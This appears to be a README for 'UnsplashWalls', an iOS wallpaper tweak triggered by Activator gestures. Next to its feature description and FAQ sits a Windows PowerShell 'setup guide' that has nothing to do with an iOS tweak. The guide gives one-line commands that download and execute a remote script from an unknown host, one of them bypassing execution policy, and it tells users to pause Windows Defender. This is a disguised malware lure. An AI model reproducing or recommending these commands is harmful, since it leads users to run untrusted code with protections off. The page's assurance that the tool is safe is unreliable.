UnsplashWalls lets you swap your iOS wallpaper for a fresh random Unsplash image with nothing more than an Activator gesture you already use. Pick a gesture, choose whether it hits your lock screen, home screen, or both, and let the app handle the rest. The screenshots below walk through each step so you can see exactly what to expect before you start. It's a small tweak that keeps your device looking new without any extra taps.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Launch PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## How It Works

Fire up UnsplashWalls and you'll land on a simple home screen with one big, friendly button: **Set Wallpaper Now**. Tap it, and the app fetches a fresh random image and applies it to your chosen screens — that's it. No accounts, no setup, no fuss.

**Pick your screens**
Before you tap, decide where the magic lands. Use the toggles for **Lock Screen** and **Home Screen** — flip on one, the other, or both. Your choice sticks around for next time, so you only set it once.

**See it before it's set**
Every wallpaper gets a quick preview so you know exactly what you're getting. Love it? Keep it. Want something else? Hit the shuffle icon for another random pick — the preview updates instantly.

**Random means random**
UnsplashWalls pulls from a huge pool of photos, so you'll rarely see the same shot twice. Each request grabs a random image at a crisp, wallpaper-friendly resolution that looks sharp on any device.

**Trigger it with a gesture**
The real party trick: assign UnsplashWalls to an Activator gesture (like a double-tap on the status bar or a swipe). One gesture later, your wallpaper is refreshed — no need to even open the app. Perfect for keeping your home screen feeling new.

**Instant refresh, zero clutter**
There's no gallery to manage, no history to clean up, and no extra steps. Tap (or gesture), preview, apply — done. Your wallpaper stays fresh while the app stays out of your way.

## FAQ

### Why does my wallpaper change without me doing anything?
That's the Activator gesture working as intended. UnsplashWalls listens for the gesture you assigned in Activator, and every time it fires, a fresh random Unsplash image gets set as your wallpaper. If you want it to stop, just remove or reassign the gesture in Activator — no need to uninstall anything.

### Which screens can it set?
Both, or just one — your choice. UnsplashWalls can target the lock screen, the home screen, or both at once. Handy if you like a calm lock screen but want something lively on your home screen. The setting is right there in the tweak's preferences.

### Where do the images come from?
Every wallpaper is a random photo pulled fresh from Unsplash, so you'll see something new each time the gesture runs. No two triggers are guaranteed to match, which is half the fun — you never know what you'll get until it lands on your screen.

### Do I need an internet connection?
Yes. UnsplashWalls fetches images live, so an active connection is required for the wallpaper to update. If you're offline when the gesture fires, the wallpaper simply won't change — reconnect and trigger it again.

### Can I choose a specific image or category?
Nope — the whole point is the surprise. UnsplashWalls is built around randomization, so there's no picker or filter to fuss with. If you want control over the exact image, this probably isn't the tweak for you.

### Nothing happens when I use my gesture — what now?
A few quick checks, in order:
- Confirm the gesture is actually assigned to UnsplashWalls in Activator.
- Make sure you have a working internet connection.
- Try a different gesture to rule out a conflict with another tweak.
- Respring and try again.

### Will it drain my battery?
Triggering a wallpaper change uses data and a bit of processing, but it only runs when your gesture fires — it's not constantly polling in the background. Casual use is light; if you've got a gesture that fires constantly, expect proportionally more data use.

### Does it work on iPad?
Yes — UnsplashWalls is designed for iOS and iPadOS alike. The gesture-and-random-image flow works the same way on both.

### Can I undo a wallpaper I don't like?
Just trigger the gesture again and you'll get a new random image. There's no history or "previous wallpaper" button, so if you land on a keeper, save it from your Photos before triggering again.

### Is it safe to use?
UnsplashWalls only does one job: fetch an image and set it as your wallpaper. It doesn't touch your personal data, and everything stays on your device once the image is downloaded.
